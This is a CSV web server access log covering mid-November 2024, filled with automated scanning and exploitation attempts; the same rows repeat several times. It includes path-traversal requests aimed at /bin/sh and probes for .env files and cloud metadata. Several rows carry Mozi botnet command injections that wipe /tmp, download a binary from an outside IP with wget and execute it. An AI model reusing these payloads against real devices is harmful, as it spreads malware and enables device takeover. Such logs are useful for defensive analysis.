ip,date,method,endpoint,status,size
10.132.130.241,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
238.45.251.195,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
46.240.198.100,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
27.185.242.241,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
11.141.147.25,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
204.5.105.204,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
229.97.26.248,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
156.81.234.210,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
225.162.238.244,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
66.126.253.129,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
37.221.98.229,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
186.34.3.53,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
57.181.52.190,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
213.165.145.222,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
199.127.4.147,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
22.241.117.247,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
122.79.244.125,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
106.132.26.106,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
211.215.145.240,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
212.89.248.0,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
120.170.185.199,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
115.227.91.194,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
241.58.225.100,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
188.231.169.27,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
91.183.232.93,19/Nov/2024:20:16:26 +0000,,-,408,
70.236.169.174,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
44.203.25.182,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
112.173.198.208,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
115.43.73.127,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
62.40.240.101,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
95.77.126.161,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
206.129.101.29,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
134.246.197.248,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
115.161.51.31,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
250.126.252.18,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
9.10.218.198,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
58.253.202.133,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
99.241.53.12,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
162.214.11.112,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
212.157.121.212,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
245.134.7.135,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
159.114.49.46,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
179.159.68.33,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
33.96.12.87,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
249.141.179.13,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
150.245.168.239,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
10.220.66.187,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
163.23.96.218,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
155.179.108.251,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
24.196.158.98,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
43.210.89.247,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
143.62.166.24,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
194.102.242.9,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
58.154.120.244,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
198.72.139.157,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
231.249.153.76,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
222.14.164.254,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
50.170.252.164,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
230.52.54.148,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
219.160.190.52,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
153.232.16.136,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
195.206.130.236,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
230.8.70.237,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
165.146.93.213,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
12.56.153.250,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
118.173.182.227,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
36.96.73.226,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
136.169.161.191,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
182.6.49.9,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
251.54.108.158,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
166.115.253.194,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
160.19.51.26,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
236.200.56.9,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
216.248.69.134,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
132.1.145.249,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
200.58.125.113,15/Nov/2024:00:35:31 +0000,,-,408,
242.123.136.129,15/Nov/2024:00:36:08 +0000,,-,408,
141.233.172.100,15/Nov/2024:00:36:30 +0000,,-,408,
183.251.12.178,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
36.130.174.108,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
216.67.26.69,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
224.67.140.53,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
232.166.168.241,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
53.99.106.79,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
119.50.127.103,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
105.50.181.160,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
172.41.62.135,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
234.231.194.217,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
73.178.150.20,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
30.153.181.28,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
60.124.223.157,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
111.27.109.165,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
161.235.28.31,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
133.75.253.48,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
224.254.158.127,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
3.178.69.79,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
20.49.125.3,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
146.104.123.117,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
212.159.169.192,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
148.67.86.208,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
103.53.134.44,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
29.170.68.152,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
146.95.166.161,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
130.64.91.127,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
29.93.51.250,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
132.206.160.173,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
91.57.169.56,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
184.141.4.227,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
55.163.209.147,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
88.208.166.73,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
128.35.163.253,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
173.202.161.64,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
30.105.251.183,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
144.123.186.107,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
193.138.171.61,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
163.248.140.169,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
223.94.190.33,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
47.76.210.53,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
20.253.27.65,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
28.82.195.95,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
77.57.207.132,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
23.123.166.170,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
96.33.28.117,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
26.251.10.199,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
240.138.107.122,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
18.8.226.248,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
169.158.137.147,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
48.3.5.93,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
80.131.13.16,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
57.225.200.217,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
111.35.98.110,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
164.173.146.64,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
97.216.56.129,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
71.67.198.152,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
231.116.18.116,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
90.239.181.35,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
97.127.251.164,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
169.184.54.203,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
54.193.204.83,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
232.189.158.48,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
41.182.0.234,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
150.14.44.235,19/Nov/2024:20:16:26 +0000,,-,408,
80.118.161.0,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
188.254.198.15,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
33.29.187.162,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
217.112.139.193,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
225.170.144.16,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
177.163.99.229,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
183.199.205.131,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
207.89.123.21,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
101.33.229.159,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
5.98.143.56,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
203.34.21.188,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
176.242.102.81,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
123.242.206.126,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
239.253.78.222,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
156.160.117.4,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
70.25.113.107,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
153.10.172.181,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
163.236.252.62,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
234.48.125.68,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
59.242.46.66,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
144.170.63.11,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
246.80.7.146,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
160.119.123.57,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
174.33.234.214,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
35.190.239.126,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
233.24.157.4,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
96.35.39.78,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
43.58.87.86,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
120.152.138.204,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
217.89.112.235,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
103.52.56.15,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
197.147.210.139,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
172.242.236.117,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
124.90.192.91,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
153.196.198.30,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
211.169.160.50,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
240.138.48.185,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
106.189.187.22,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
68.64.153.180,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
84.105.30.124,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
202.85.238.195,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
31.240.55.32,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
48.192.59.129,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
66.32.171.134,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
134.84.81.115,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
235.163.227.204,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
198.54.7.52,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
140.253.95.137,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
97.215.113.53,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
11.208.51.112,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
21.188.165.148,15/Nov/2024:00:35:31 +0000,,-,408,
89.224.74.121,15/Nov/2024:00:36:08 +0000,,-,408,
77.165.246.35,15/Nov/2024:00:36:30 +0000,,-,408,
140.41.44.82,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
143.76.103.122,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
79.108.253.91,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
140.35.223.229,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
151.201.200.2,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
233.103.165.141,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
99.164.112.61,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
117.183.169.142,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
253.187.29.192,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
53.145.97.106,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
149.215.228.116,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
71.208.109.248,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
184.165.15.54,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
159.45.249.71,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
130.31.231.48,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
254.188.229.51,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
193.119.220.176,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
231.44.159.99,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
213.45.210.60,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
182.211.197.70,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
205.142.174.192,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
223.58.163.236,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
247.201.16.243,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
154.66.136.169,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
104.121.51.104,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
167.187.75.69,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
78.190.40.125,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
164.99.168.73,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
14.178.1.157,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
225.252.179.90,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
37.139.56.72,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
221.151.99.89,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
116.167.80.63,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
240.63.19.94,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
96.236.41.0,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
225.45.83.86,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
163.181.35.238,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
119.69.100.127,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
3.71.13.131,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
140.196.130.161,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
218.253.147.186,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
31.105.11.104,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
100.23.168.148,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
219.234.195.33,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
76.169.81.169,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
71.14.182.22,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
125.55.36.216,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
81.56.145.247,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
239.67.68.68,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
181.202.132.134,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
215.11.11.214,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
6.102.206.127,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
48.224.135.116,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
33.98.31.66,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
212.122.25.86,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
234.74.106.240,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
97.143.220.159,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
135.148.1.65,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
240.44.133.214,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
15.97.211.234,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
237.213.216.69,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
111.5.106.72,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
3.61.128.173,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
83.116.248.138,19/Nov/2024:20:16:26 +0000,,-,408,
94.200.225.224,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
31.164.152.194,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
43.129.133.98,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
73.173.192.115,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
71.70.92.113,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
185.199.53.164,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
149.221.9.200,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
95.113.37.144,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
122.166.57.98,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
194.237.240.91,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
218.161.6.18,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
109.177.143.205,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
187.154.140.196,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
91.171.67.84,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
203.224.54.137,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
97.171.220.225,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
